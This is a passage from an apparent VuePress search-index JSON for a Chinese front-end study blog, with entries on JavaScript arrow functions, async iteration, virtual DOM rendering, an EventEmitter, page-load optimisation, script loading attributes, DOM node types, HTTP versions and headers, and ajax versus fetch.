      "content": "# 箭头函数\n\n\n# 箭头函数的缺点\n\n * 1、没有arguments\n\nconst fn =()=>{\n  console.log(arguments)\n}\nfn(100,200) //arguments is not defined\n\n\n * 2、无法通过apply，bind，call来改变this,箭头函数的this指向其父作用域\n\nconst fn2 =()=>{\n  console.log('this :>> ', this);\n}\nfn2() //this指向window对象\nfn2.apply({a:1}) //无法通过此方法改变this，打印后this仍指向window\n\nfunction fn3(){\n  console.log('this :>> ', this);\n}\nfn3.apply({a:1}) //this指向{a:1}\n\n\n\n# 哪些场景不能使用this\n\n * 1、对象方法\n\nlet obj = {\n  name:'yang',\n  say:()=>{\n    return this.name\n  }\n}\nconsole.log('obj.say() :>> ', obj.say()); //获取不到此方法\n\n\n * 2、原型方法\n\nlet obj = {\n  name:'yang'\n}\nobj.__proto__.getName = ()=>{\n  return this.name\n}\nconsole.log(obj.getName()); //获取不到\n\n\n\n * 3、构造函数\n\nconst fn4 = (name)=>{\n  this.name= name\n}\nlet f = new fn4('yang')\nconsole.log('f :>> ', f); //fn4 is not a constructor\n\n\n\n * 4、Vue的生命周期和method\n\n以下的代码完全不可以\n\n{\ndata(){\n  return {\n    name:'yang'\n  }\n}\nmounted:()=>{\n  console.log(this.name)\n}\nmethods: {\n  say:()=>{\n    return this.name\n  }\n}\n}\n\n\n可以理解为Vue本身是个对象，如同第一点所说对象中的方法不能使用箭头函数\n\n> 注：class中可以使用箭头函数",
      "normalizedContent": "# 箭头函数\n\n\n# 箭头函数的缺点\n\n * 1、没有arguments\n\nconst fn =()=>{\n  console.log(arguments)\n}\nfn(100,200) //arguments is not defined\n\n\n * 2、无法通过apply，bind，call来改变this,箭头函数的this指向其父作用域\n\nconst fn2 =()=>{\n  console.log('this :>> ', this);\n}\nfn2() //this指向window对象\nfn2.apply({a:1}) //无法通过此方法改变this，打印后this仍指向window\n\nfunction fn3(){\n  console.log('this :>> ', this);\n}\nfn3.apply({a:1}) //this指向{a:1}\n\n\n\n# 哪些场景不能使用this\n\n * 1、对象方法\n\nlet obj = {\n  name:'yang',\n  say:()=>{\n    return this.name\n  }\n}\nconsole.log('obj.say() :>> ', obj.say()); //获取不到此方法\n\n\n * 2、原型方法\n\nlet obj = {\n  name:'yang'\n}\nobj.__proto__.getname = ()=>{\n  return this.name\n}\nconsole.log(obj.getname()); //获取不到\n\n\n\n * 3、构造函数\n\nconst fn4 = (name)=>{\n  this.name= name\n}\nlet f = new fn4('yang')\nconsole.log('f :>> ', f); //fn4 is not a constructor\n\n\n\n * 4、vue的生命周期和method\n\n以下的代码完全不可以\n\n{\ndata(){\n  return {\n    name:'yang'\n  }\n}\nmounted:()=>{\n  console.log(this.name)\n}\nmethods: {\n  say:()=>{\n    return this.name\n  }\n}\n}\n\n\n可以理解为vue本身是个对象，如同第一点所说对象中的方法不能使用箭头函数\n\n> 注：class中可以使用箭头函数",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "for await of",
      "frontmatter": {
        "title": "for await of"
      },
      "regularPath": "/webstudy/ES6%E5%8F%8A%E4%BB%A5%E4%B8%8A/for%20await%20of.html",
      "relativePath": "webstudy/ES6及以上/for await of.md",
      "key": "v-c68b6434",
      "path": "/webstudy/ES6%E5%8F%8A%E4%BB%A5%E4%B8%8A/for%20await%20of.html",
      "headers": [
        {
          "level": 2,
          "title": "for await of(异步迭代器)",
          "slug": "for-await-of-异步迭代器",
          "normalizedTitle": "for await of(异步迭代器)",
          "charIndex": 2
        },
        {
          "level": 3,
          "title": "for await of",
          "slug": "for-await-of",
          "normalizedTitle": "for await of",
          "charIndex": 2
        }
      ],
      "headersStr": "for await of(异步迭代器) for await of",
      "content": "# for await of(异步迭代器)\n\n\n# for await of\n\n循环等待每个Promise对象变为resolved状态才进入下一步\n\nfunction getData(data){\n    return new Promise(resovle=>{\n      setTimeout(()=>{\n        resovle(data)\n      },1500)\n    })\n  }\n  //使用Promise.all\n  (async function(){\n    const apiList = [getData(100),getData(200),getData(300)]\n    Promise.all(apiList).then(res=>{\n      console.log('res :>> ', res); //[100,200,300]\n    })\n  })()\n  //使用for await of\n  (async function(){\n    const apiList = [getData(100),getData(200),getData(300)]\n    for await(let res of apiList){\n      console.log('res :>> ', res);\n    }\n  })()\n\n\n> for await of等同于Promise.all,写法更加优雅",
      "normalizedContent": "# for await of(异步迭代器)\n\n\n# for await of\n\n循环等待每个promise对象变为resolved状态才进入下一步\n\nfunction getdata(data){\n    return new promise(resovle=>{\n      settimeout(()=>{\n        resovle(data)\n      },1500)\n    })\n  }\n  //使用promise.all\n  (async function(){\n    const apilist = [getdata(100),getdata(200),getdata(300)]\n    promise.all(apilist).then(res=>{\n      console.log('res :>> ', res); //[100,200,300]\n    })\n  })()\n  //使用for await of\n  (async function(){\n    const apilist = [getdata(100),getdata(200),getdata(300)]\n    for await(let res of apilist){\n      console.log('res :>> ', res);\n    }\n  })()\n\n\n> for await of等同于promise.all,写法更加优雅",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "虚拟 dom 转化为真实 dom",
      "frontmatter": {},
      "regularPath": "/javascript/%E8%99%9A%E6%8B%9Fdom%E8%BD%AC%E5%8C%96%E4%B8%BA%E7%9C%9F%E5%AE%9Edom.html",
      "relativePath": "javascript/虚拟dom转化为真实dom.md",
      "key": "v-6e9842f2",
      "path": "/javascript/%E8%99%9A%E6%8B%9Fdom%E8%BD%AC%E5%8C%96%E4%B8%BA%E7%9C%9F%E5%AE%9Edom.html",
      "headersStr": null,
      "content": "# 虚拟 dom 转化为真实 dom\n\n{\n  tag: 'DIV',\n  attrs:{\n  id:'app'\n  },\n  children: [\n    {\n      tag: 'SPAN',\n      children: [\n        { tag: 'A', children: [] }\n      ]\n    },\n    {\n      tag: 'SPAN',\n      children: [\n        { tag: 'A', children: [] },\n        { tag: 'A', children: [] }\n      ]\n    }\n  ]\n}\n// 把上诉虚拟Dom转化成下方真实Dom\n<div id=\"app\">\n  <span>\n    <a></a>\n  </span>\n  <span>\n    <a></a>\n    <a></a>\n  </span>\n</div>\n\n\n实现\n\n// 真正的渲染函数\nfunction _render(vnode) {\n  // 如果是数字类型转化为字符串\n  if (typeof vnode === \"number\") {\n    vnode = String(vnode);\n  }\n  // 字符串类型直接就是文本节点\n  if (typeof vnode === \"string\") {\n    return document.createTextNode(vnode);\n  }\n  // 普通DOM\n  const dom = document.createElement(vnode.tag);\n  if (vnode.attrs) {\n    // 遍历属性\n    Object.keys(vnode.attrs).forEach((key) => {\n      const value = vnode.attrs[key];\n      dom.setAttribute(key, value);\n    });\n  }\n  // 子数组进行递归操作 这一步是关键\n  vnode.children.forEach((child) => dom.appendChild(_render(child)));\n  return dom;\n}\n",
      "normalizedContent": "# 虚拟 dom 转化为真实 dom\n\n{\n  tag: 'div',\n  attrs:{\n  id:'app'\n  },\n  children: [\n    {\n      tag: 'span',\n      children: [\n        { tag: 'a', children: [] }\n      ]\n    },\n    {\n      tag: 'span',\n      children: [\n        { tag: 'a', children: [] },\n        { tag: 'a', children: [] }\n      ]\n    }\n  ]\n}\n// 把上诉虚拟dom转化成下方真实dom\n<div id=\"app\">\n  <span>\n    <a></a>\n  </span>\n  <span>\n    <a></a>\n    <a></a>\n  </span>\n</div>\n\n\n实现\n\n// 真正的渲染函数\nfunction _render(vnode) {\n  // 如果是数字类型转化为字符串\n  if (typeof vnode === \"number\") {\n    vnode = string(vnode);\n  }\n  // 字符串类型直接就是文本节点\n  if (typeof vnode === \"string\") {\n    return document.createtextnode(vnode);\n  }\n  // 普通dom\n  const dom = document.createelement(vnode.tag);\n  if (vnode.attrs) {\n    // 遍历属性\n    object.keys(vnode.attrs).foreach((key) => {\n      const value = vnode.attrs[key];\n      dom.setattribute(key, value);\n    });\n  }\n  // 子数组进行递归操作 这一步是关键\n  vnode.children.foreach((child) => dom.appendchild(_render(child)));\n  return dom;\n}\n",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "发布订阅",
      "frontmatter": {},
      "regularPath": "/javascript/%E6%89%8B%E5%86%99%E5%8F%91%E5%B8%83%E8%AE%A2%E9%98%85.html",
      "relativePath": "javascript/手写发布订阅.md",
      "key": "v-09e253aa",
      "path": "/javascript/%E6%89%8B%E5%86%99%E5%8F%91%E5%B8%83%E8%AE%A2%E9%98%85.html",
      "headersStr": null,
      "content": "# 发布订阅\n\nclass EventEmitter {\n  constructor() {\n    this.events = {};\n  }\n  // 实现订阅\n  on(type, callBack) {\n    if (!this.events[type]) {\n      this.events[type] = [callBack];\n    } else {\n      this.events[type].push(callBack);\n    }\n  }\n  // 删除订阅\n  off(type, callBack) {\n    if (!this.events[type]) return;\n    this.events[type] = this.events[type].filter((item) => {\n      return item !== callBack;\n    });\n  }\n  // 只执行一次订阅事件\n  once(type, callBack) {\n    function fn() {\n      callBack();\n      this.off(type, fn);\n    }\n    this.on(type, fn);\n  }\n  // 触发事件\n  emit(type, ...rest) {\n    this.events[type] &&\n      this.events[type].forEach((fn) => fn.apply(this, rest));\n  }\n}\n// 使用如下\n// const event = new EventEmitter();\n\n// const handle = (...rest) => {\n//   console.log(rest);\n// };\n\n// event.on(\"click\", handle);\n\n// event.emit(\"click\", 1, 2, 3, 4);\n\n// event.off(\"click\", handle);\n\n// event.emit(\"click\", 1, 2);\n\n// event.once(\"dbClick\", () => {\n//   console.log(123456);\n// });\n// event.emit(\"dbClick\");\n// event.emit(\"dbClick\");\n",
      "normalizedContent": "# 发布订阅\n\nclass eventemitter {\n  constructor() {\n    this.events = {};\n  }\n  // 实现订阅\n  on(type, callback) {\n    if (!this.events[type]) {\n      this.events[type] = [callback];\n    } else {\n      this.events[type].push(callback);\n    }\n  }\n  // 删除订阅\n  off(type, callback) {\n    if (!this.events[type]) return;\n    this.events[type] = this.events[type].filter((item) => {\n      return item !== callback;\n    });\n  }\n  // 只执行一次订阅事件\n  once(type, callback) {\n    function fn() {\n      callback();\n      this.off(type, fn);\n    }\n    this.on(type, fn);\n  }\n  // 触发事件\n  emit(type, ...rest) {\n    this.events[type] &&\n      this.events[type].foreach((fn) => fn.apply(this, rest));\n  }\n}\n// 使用如下\n// const event = new eventemitter();\n\n// const handle = (...rest) => {\n//   console.log(rest);\n// };\n\n// event.on(\"click\", handle);\n\n// event.emit(\"click\", 1, 2, 3, 4);\n\n// event.off(\"click\", handle);\n\n// event.emit(\"click\", 1, 2);\n\n// event.once(\"dbclick\", () => {\n//   console.log(123456);\n// });\n// event.emit(\"dbclick\");\n// event.emit(\"dbclick\");\n",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "Home",
      "frontmatter": {
        "home": true,
        "heroImage": null,
        "actionText": "开始阅读",
        "actionLink": "/guide/",
        "features": [
          {
            "title": "前端",
            "details": "js,http,css,vue......"
          },
          {
            "title": "Javascript",
            "details": "一些coding,常见的手写"
          },
          {
            "title": "数据结构(DataStructure)",
            "details": "目测才刚开始....."
          }
        ],
        "footer": "MIT Licensed | Copyright © 2021-present Yang"
      },
      "regularPath": "/",
      "relativePath": "README.md",
      "key": "v-335c11a2",
      "path": "/",
      "headersStr": null,
      "content": "Keep Coding\n\nstay hungry stay humble\n\n\n\n",
      "normalizedContent": "keep coding\n\nstay hungry stay humble\n\n\n\n",
      "charsets": {}
    },
    {
      "title": "首屏优化",
      "frontmatter": {
        "title": "首屏优化"
      },
      "regularPath": "/webstudy/Experience/%E9%A6%96%E5%B1%8F%E4%BC%98%E5%8C%96.html",
      "relativePath": "webstudy/Experience/首屏优化.md",
      "key": "v-b97afcba",
      "path": "/webstudy/Experience/%E9%A6%96%E5%B1%8F%E4%BC%98%E5%8C%96.html",
      "headers": [
        {
          "level": 2,
          "title": "1、SPA单页面路由懒加载",
          "slug": "_1、spa单页面路由懒加载",
          "normalizedTitle": "1、spa单页面路由懒加载",
          "charIndex": 11
        },
        {
          "level": 2,
          "title": "2、服务端渲染 SSR（首屏优化的终极方案）",
          "slug": "_2、服务端渲染-ssr-首屏优化的终极方案",
          "normalizedTitle": "2、服务端渲染 ssr（首屏优化的终极方案）",
          "charIndex": 144
        },
        {
          "level": 2,
          "title": "3、App 预取",
          "slug": "_3、app-预取",
          "normalizedTitle": "3、app 预取",
          "charIndex": 215
        },
        {
          "level": 2,
          "title": "分页",
          "slug": "分页",
          "normalizedTitle": "分页",
          "charIndex": 458
        },
        {
          "level": 2,
          "title": "图片懒加载",
          "slug": "图片懒加载",
          "normalizedTitle": "图片懒加载",
          "charIndex": 465
        },
        {
          "level": 2,
          "title": "其他的体验优化",
          "slug": "其他的体验优化",
          "normalizedTitle": "其他的体验优化",
          "charIndex": 475
        }
      ],
      "headersStr": "1、SPA单页面路由懒加载 2、服务端渲染 SSR（首屏优化的终极方案） 3、App 预取 分页 图片懒加载 其他的体验优化",
      "content": "# 首屏优化\n\n\n# 1、SPA单页面路由懒加载\n\n * 先加载首页路由，Vue本身支持路由懒加载\n\nconst Home = () => import(/* webpackChunkName: 'HomeComponents' */ '@/components/home')\n\n\n\n# 2、服务端渲染 SSR（首屏优化的终极方案）\n\n * 网页内容由服务端生成 首屏时间短 有利于seo 如下图\n\n * Nuxt.js\n\n\n# 3、App 预取\n\n如果 H5 在 App webview 中展示，可以使用 App 预取资源\n\n * 在列表页，App 预取数据（一般是标题、首页文本，不包括图片、视频）\n * 进入详情页，H5 直接即可渲染 App 预取的数据\n * 可能会造成“浪费”：预期了，但用户未进入该详情页 —— 不过没关系，现在流量便宜\n\n例如，你在浏览朋友圈时，可以快速的打开某个公众号的文章。\n\n这里可以联想到 prefetch ，不过它是预取 js css 等静态资源，并不是首屏的内容。\n\n\n# 分页\n\n\n# 图片懒加载\n\n\n# 其他的体验优化\n\n骨架屏 loading",
      "normalizedContent": "# 首屏优化\n\n\n# 1、spa单页面路由懒加载\n\n * 先加载首页路由，vue本身支持路由懒加载\n\nconst home = () => import(/* webpackchunkname: 'homecomponents' */ '@/components/home')\n\n\n\n# 2、服务端渲染 ssr（首屏优化的终极方案）\n\n * 网页内容由服务端生成 首屏时间短 有利于seo 如下图\n\n * nuxt.js\n\n\n# 3、app 预取\n\n如果 h5 在 app webview 中展示，可以使用 app 预取资源\n\n * 在列表页，app 预取数据（一般是标题、首页文本，不包括图片、视频）\n * 进入详情页，h5 直接即可渲染 app 预取的数据\n * 可能会造成“浪费”：预期了，但用户未进入该详情页 —— 不过没关系，现在流量便宜\n\n例如，你在浏览朋友圈时，可以快速的打开某个公众号的文章。\n\n这里可以联想到 prefetch ，不过它是预取 js css 等静态资源，并不是首屏的内容。\n\n\n# 分页\n\n\n# 图片懒加载\n\n\n# 其他的体验优化\n\n骨架屏 loading",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "defer和async",
      "frontmatter": {
        "title": "defer和async"
      },
      "regularPath": "/webstudy/HTML/defer%E5%92%8Casync.html",
      "relativePath": "webstudy/HTML/defer和async.md",
      "key": "v-b3858932",
      "path": "/webstudy/HTML/defer%E5%92%8Casync.html",
      "headers": [
        {
          "level": 2,
          "title": "script标签的defer和async属性",
          "slug": "script标签的defer和async属性",
          "normalizedTitle": "script标签的defer和async属性",
          "charIndex": 18
        },
        {
          "level": 2,
          "title": "preload和refetch",
          "slug": "preload和refetch",
          "normalizedTitle": "preload和refetch",
          "charIndex": 283
        },
        {
          "level": 2,
          "title": "dns-prefetch和preconnect",
          "slug": "dns-prefetch和preconnect",
          "normalizedTitle": "dns-prefetch和preconnect",
          "charIndex": 813
        }
      ],
      "headersStr": "script标签的defer和async属性 preload和refetch dns-prefetch和preconnect",
      "content": "# defer和async\n\n\n# script标签的defer和async属性\n\n * <script src=\"xxx.js\"> 当解析到该标签时，会暂停 html 解析，并触发 js 下载、执行。然后再继续 html 解析。\n * <script async src=\"xxx.js\"> js 下载和 html 解析可并行，下载完之后暂停 html 解析，执行 js 。然后再继续 html 解析。\n * <script defer src=\"xxx.js\"> js 下载和 html 解析可并行。等待 html 解析完之后再执行 js 。\n\n如下图\n\n\n# preload和refetch\n\n * preload 表示资源在当前页面使用，浏览器会优先加载\n * prefetch 表示资源可能在未来的页面（如通过链接打开下一个页面）使用，浏览器将在空闲时加载\n\n<head>\n  <meta charset=\"utf-8\">\n  <title>JS and CSS preload</title>\n\n  <!-- preload -->\n  <link rel=\"preload\" href=\"style.css\" as=\"style\">\n  <link rel=\"preload\" href=\"main.js\" as=\"script\">\n\n  <!-- prefetch -->\n  <link rel=\"prefetch\" href=\"other.js\" as=\"script\">\n\n  <!-- 引用 css -->\n  <link rel=\"stylesheet\" href=\"style.css\">\n</head>\n\n<body>\n  <h1>hello</h1>\n\n  <!-- 引用 js -->\n  <script src=\"main.js\" defer></script>\n</body>\n\n\n\n# dns-prefetch和preconnect\n\n浏览器要建立一个连接，一般需要经过DNS查找，TCP三次握手和TLS协商（如果是https的话），这些过程都是需要相当的耗时的，所以preconnet，就是一项使浏览器能够预先建立一个连接，等真正需要加载资源的时候就能够直接请求了。\n\ndns-prefetch 即 DNS 预获取，preconnect 即预连接。\n\n\n * dns-prefetch就是一项使浏览器主动去执行域名解析的功能\n * 当网页请求第三方资源时，可以提前进行 DNS 查询、TCP 连接，以减少请求时的时间。\n\n<html>\n  <head>\n    <link rel=\"dns-prefetch\" href=\"https://fonts.gstatic.com/\">\n    <link rel=\"preconnect\" href=\"https://fonts.gstatic.com/\" crossorigin>\n\n  </head>\n  <body>\n      <p>hello</p>\n  </body>\n</html>\n",
      "normalizedContent": "# defer和async\n\n\n# script标签的defer和async属性\n\n * <script src=\"xxx.js\"> 当解析到该标签时，会暂停 html 解析，并触发 js 下载、执行。然后再继续 html 解析。\n * <script async src=\"xxx.js\"> js 下载和 html 解析可并行，下载完之后暂停 html 解析，执行 js 。然后再继续 html 解析。\n * <script defer src=\"xxx.js\"> js 下载和 html 解析可并行。等待 html 解析完之后再执行 js 。\n\n如下图\n\n\n# preload和refetch\n\n * preload 表示资源在当前页面使用，浏览器会优先加载\n * prefetch 表示资源可能在未来的页面（如通过链接打开下一个页面）使用，浏览器将在空闲时加载\n\n<head>\n  <meta charset=\"utf-8\">\n  <title>js and css preload</title>\n\n  <!-- preload -->\n  <link rel=\"preload\" href=\"style.css\" as=\"style\">\n  <link rel=\"preload\" href=\"main.js\" as=\"script\">\n\n  <!-- prefetch -->\n  <link rel=\"prefetch\" href=\"other.js\" as=\"script\">\n\n  <!-- 引用 css -->\n  <link rel=\"stylesheet\" href=\"style.css\">\n</head>\n\n<body>\n  <h1>hello</h1>\n\n  <!-- 引用 js -->\n  <script src=\"main.js\" defer></script>\n</body>\n\n\n\n# dns-prefetch和preconnect\n\n浏览器要建立一个连接，一般需要经过dns查找，tcp三次握手和tls协商（如果是https的话），这些过程都是需要相当的耗时的，所以preconnet，就是一项使浏览器能够预先建立一个连接，等真正需要加载资源的时候就能够直接请求了。\n\ndns-prefetch 即 dns 预获取，preconnect 即预连接。\n\n\n * dns-prefetch就是一项使浏览器主动去执行域名解析的功能\n * 当网页请求第三方资源时，可以提前进行 dns 查询、tcp 连接，以减少请求时的时间。\n\n<html>\n  <head>\n    <link rel=\"dns-prefetch\" href=\"https://fonts.gstatic.com/\">\n    <link rel=\"preconnect\" href=\"https://fonts.gstatic.com/\" crossorigin>\n\n  </head>\n  <body>\n      <p>hello</p>\n  </body>\n</html>\n",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "node和element",
      "frontmatter": {
        "title": "node和element"
      },
      "regularPath": "/webstudy/HTML/node%E5%92%8Celement.html",
      "relativePath": "webstudy/HTML/node和element.md",
      "key": "v-069b9fca",
      "path": "/webstudy/HTML/node%E5%92%8Celement.html",
      "headers": [
        {
          "level": 3,
          "title": "node和element",
          "slug": "node和element",
          "normalizedTitle": "node和element",
          "charIndex": 2
        },
        {
          "level": 3,
          "title": "HTMLCollection和NodeList",
          "slug": "htmlcollection和nodelist",
          "normalizedTitle": "htmlcollection和nodelist",
          "charIndex": 106
        }
      ],
      "headersStr": "node和element HTMLCollection和NodeList",
      "content": "# node和element\n\n\n\n * DOM树的每一个节点都是node\n * Node是一个基类，是Element的基类\n * ELement是其他HTML元素的基类，如HTMLDivElement\n\n\n# HTMLCollection和NodeList\n\n * HTMLCollection是Element的集合\n * NodeList是node的集合\n\n<html>\n  <p id=\"p1\">\n    <span>标签1</span><b>标签2</b>\n  </p>\n</html>\n<script>\n  const p = document.getElementById('p1')\n  console.log('p :>> ', p); \n  //children和childNodes的明显区别\n  //children是Element中的节点，div，span等标签\n  console.log('p.children :>> ', p.children); //HTMLCollection(2)  [span, b]\n  //childNodes包含node节点，包括text和comment等\n  console.log('p.childNodes :>> ', p.childNodes); //NodeList(4)  [text, span, b, text]\n</script>\n\n\n> 注：HTMLCollection和NodeList不是数组，是类数组\n\n# 那么如何将类数组编程数组\n\n * Array.from(list)\n * Array.prototype.slice.call(list)\n * [...list]",
      "normalizedContent": "# node和element\n\n\n\n * dom树的每一个节点都是node\n * node是一个基类，是element的基类\n * element是其他html元素的基类，如htmldivelement\n\n\n# htmlcollection和nodelist\n\n * htmlcollection是element的集合\n * nodelist是node的集合\n\n<html>\n  <p id=\"p1\">\n    <span>标签1</span><b>标签2</b>\n  </p>\n</html>\n<script>\n  const p = document.getelementbyid('p1')\n  console.log('p :>> ', p); \n  //children和childnodes的明显区别\n  //children是element中的节点，div，span等标签\n  console.log('p.children :>> ', p.children); //htmlcollection(2)  [span, b]\n  //childnodes包含node节点，包括text和comment等\n  console.log('p.childnodes :>> ', p.childnodes); //nodelist(4)  [text, span, b, text]\n</script>\n\n\n> 注：htmlcollection和nodelist不是数组，是类数组\n\n# 那么如何将类数组编程数组\n\n * array.from(list)\n * array.prototype.slice.call(list)\n * [...list]",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "Http协议1.0,1.1,2.0",
      "frontmatter": {
        "title": "Http协议1.0,1.1,2.0"
      },
      "regularPath": "/webstudy/HTTP/Http%E5%8D%8F%E8%AE%AE1.0,1.1,2.0.html",
      "relativePath": "webstudy/HTTP/Http协议1.0,1.1,2.0.md",
      "key": "v-5e76828e",
      "path": "/webstudy/HTTP/Http%E5%8D%8F%E8%AE%AE1.0,1.1,2.0.html",
      "headers": [
        {
          "level": 2,
          "title": "Http1.0",
          "slug": "http1-0",
          "normalizedTitle": "http1.0",
          "charIndex": 237
        },
        {
          "level": 2,
          "title": "Http1.1",
          "slug": "http1-1",
          "normalizedTitle": "http1.1",
          "charIndex": 268
        },
        {
          "level": 2,
          "title": "Http2.0",
          "slug": "http2-0",
          "normalizedTitle": "http2.0",
          "charIndex": 437
        },
        {
          "level": 3,
          "title": "Restful API",
          "slug": "restful-api",
          "normalizedTitle": "restful api",
          "charIndex": 362
        },
        {
          "level": 2,
          "title": "https",
          "slug": "https",
          "normalizedTitle": "https",
          "charIndex": 710
        },
        {
          "level": 2,
          "title": "http Headers",
          "slug": "http-headers",
          "normalizedTitle": "http headers",
          "charIndex": 781
        },
        {
          "level": 3,
          "title": "request Headers",
          "slug": "request-headers",
          "normalizedTitle": "request headers",
          "charIndex": 798
        },
        {
          "level": 3,
          "title": "Response Headers",
          "slug": "response-headers",
          "normalizedTitle": "response headers",
          "charIndex": 1171
        }
      ],
      "headersStr": "Http1.0 Http1.1 Http2.0 Restful API https http Headers request Headers Response Headers",
      "content": "# Http协议\n\n超文本传输协议HTTP协议被用于在Web浏览器和网站服务器之间传递信息 HTTP协议传输的数据都是未加密的，也就是明文的，因此使用HTTP协议传输隐私信息非常不安全，为了保证这些隐私数据能加密传输，于是网景公司设计了SSL（Secure Sockets Layer）协议用于对HTTP协议传输的数据进行加密，从而就诞生了HTTPS。简单来说，HTTPS协议是由SSL+HTTP协议构建的可进行加密传输、身份认证的网络协议，要比http协议安全。\n\n\n# Http1.0\n\n * 只能支持get和post请求\n\n\n# Http1.1\n\n * 引入更多的缓存策略，如 cache-control E-tag\n * 支持断点续传，状态吗 206\n * 增加新的 method PUT DELETE 等，可以设计Restful API\n * 长链接，默认开启 Connection: keep-alive ，多次 http 请求减少了 TCP 连接次数\n\n\n# Http2.0\n\n * 支持header 压缩，以减少请求体积\n * 多路复用，一个 TCP 连接中可以多个 http 并行请求。拼接资源（如雪碧图、多 js 拼接一个）将变的多余\n * 服务器端推送\n\n\n# Restful API\n\n> 用URL定位资源、用HTTP动词（GET,POST,PUT,DELETE)描述操作\n\n * GET（SELECT）：从服务器取出资源。\n * POST（CREATE）：在服务器新建一个资源。\n * PUT（UPDATE）：在服务器更新资源。\n * DELETE（DELETE）：从服务器删除资源。\n\n\n# https\n\nhttp + TLS/SSL = https ，即加密传输信息。只有客户端和服务端可以解密为明文，中间的过程无法解密。\n\n\n# http Headers\n\n\n# request Headers\n\n * accept: */* 可接受的数据格式\n * accept-encoding: gzip, deflate, br 浏览器可接收的压缩算法\n * accept-language: zh-CN,zh;q=0.9,en;q=0.8 语言\n * user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36\n * cookie\n * host 请求的域名\n * Content-type 发送数据的格式\n * Expires 强缓存http1.0\n * Cache-Control 强缓存http1.1\n\n\n# Response Headers\n\n * content-type 服务端向客户端返回的数据的格式\n * Content-length 返回数据的大小\n * set-cookie 服务端向客户端设置cookie\n * Date\n * Content-Encoding 浏览器可接收的压缩算法",
      "normalizedContent": "# http协议\n\n超文本传输协议http协议被用于在web浏览器和网站服务器之间传递信息 http协议传输的数据都是未加密的，也就是明文的，因此使用http协议传输隐私信息非常不安全，为了保证这些隐私数据能加密传输，于是网景公司设计了ssl（secure sockets layer）协议用于对http协议传输的数据进行加密，从而就诞生了https。简单来说，https协议是由ssl+http协议构建的可进行加密传输、身份认证的网络协议，要比http协议安全。\n\n\n# http1.0\n\n * 只能支持get和post请求\n\n\n# http1.1\n\n * 引入更多的缓存策略，如 cache-control e-tag\n * 支持断点续传，状态吗 206\n * 增加新的 method put delete 等，可以设计restful api\n * 长链接，默认开启 connection: keep-alive ，多次 http 请求减少了 tcp 连接次数\n\n\n# http2.0\n\n * 支持header 压缩，以减少请求体积\n * 多路复用，一个 tcp 连接中可以多个 http 并行请求。拼接资源（如雪碧图、多 js 拼接一个）将变的多余\n * 服务器端推送\n\n\n# restful api\n\n> 用url定位资源、用http动词（get,post,put,delete)描述操作\n\n * get（select）：从服务器取出资源。\n * post（create）：在服务器新建一个资源。\n * put（update）：在服务器更新资源。\n * delete（delete）：从服务器删除资源。\n\n\n# https\n\nhttp + tls/ssl = https ，即加密传输信息。只有客户端和服务端可以解密为明文，中间的过程无法解密。\n\n\n# http headers\n\n\n# request headers\n\n * accept: */* 可接受的数据格式\n * accept-encoding: gzip, deflate, br 浏览器可接收的压缩算法\n * accept-language: zh-cn,zh;q=0.9,en;q=0.8 语言\n * user-agent: mozilla/5.0 (macintosh; intel mac os x 10_15_7) applewebkit/537.36 (khtml, like gecko) chrome/103.0.0.0 safari/537.36\n * cookie\n * host 请求的域名\n * content-type 发送数据的格式\n * expires 强缓存http1.0\n * cache-control 强缓存http1.1\n\n\n# response headers\n\n * content-type 服务端向客户端返回的数据的格式\n * content-length 返回数据的大小\n * set-cookie 服务端向客户端设置cookie\n * date\n * content-encoding 浏览器可接收的压缩算法",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "ajax-fetch-axios",
      "frontmatter": {
        "title": "ajax-fetch-axios"
      },
      "regularPath": "/webstudy/HTTP/ajax-fetch-axios.html",
      "relativePath": "webstudy/HTTP/ajax-fetch-axios.md",
      "key": "v-6d59cd32",
      "path": "/webstudy/HTTP/ajax-fetch-axios.html",
      "headers": [
        {
          "level": 2,
          "title": "ajax",
          "slug": "ajax",
          "normalizedTitle": "ajax",
          "charIndex": 2
        },
        {
          "level": 3,
          "title": "面试题：请用 XMLHttpRequest 实现 ajax",
          "slug": "面试题-请用-xmlhttprequest-实现-ajax",
          "normalizedTitle": "面试题：请用 xmlhttprequest 实现 ajax",
          "charIndex": 323
        },
        {
          "level": 2,
          "title": "fetch",
          "slug": "fetch",
          "normalizedTitle": "fetch",
          "charIndex": 7
        },
        {
          "level": 3,
          "title": "面试题：用 fetch 实现一个 ajax",
          "slug": "面试题-用-fetch-实现一个-ajax",
          "normalizedTitle": "面试题：用 fetch 实现一个 ajax",
          "charIndex": 816
        },
        {
          "level": 2,
          "title": "axios",
          "slug": "axios",
          "normalizedTitle": "axios",
          "charIndex": 13
        }
      ],
      "headersStr": "ajax 面试题：请用 XMLHttpRequest 实现 ajax fetch 面试题：用 fetch 实现一个 ajax axios",
      "content": "# ajax fetch axios 的区别\n\n * ajax 是一种技术称呼，不是具体的 API 和库\n * fetch 是新的异步请求 API ，可代替 XMLHttpRequest\n * axios 是第三方库\n\n\n# ajax\n\nAJAX （几个单词首字母，按规范应该大写） - Asynchronous JavaScript and XML（异步的 JavaScript 和 XML）\n即使用 JS 进行异步请求，是 Web2.0 的技术基础，从 2005 年左右开始发起。\n所以，这里的 AJAX 就是一个称呼，一个缩写。\n\n基于当时 JS 规范，异步请求主要使用 XMLHttpRequest 这个底层 API 。\n所以，\n\n\n# 面试题：请用 XMLHttpRequest 实现 ajax\n\nfunction ajax(url, successFn) {\n    const xhr = new XMLHttpRequest()\n    xhr.open(\"GET\", url, false)\n    xhr.onreadystatechange = function () {\n        // 这里的函数异步执行，可参考之前 JS 基础中的异步模块\n        if (xhr.readyState == 4) {\n            if (xhr.status == 200) {\n                successFn(xhr.responseText)\n            }\n        }\n    }\n    xhr.send(null)\n}\n\n\n\n# fetch\n\nfetch 是一个原生 API ，它和 XMLHttpRequest 一个级别。\n\nfetch 和 XMLHttpRequest 的区别\n\n * 写法更加简洁\n * 原生支持 promise\n\n\n# 面试题：用 fetch 实现一个 ajax\n\nfunction ajax(url) 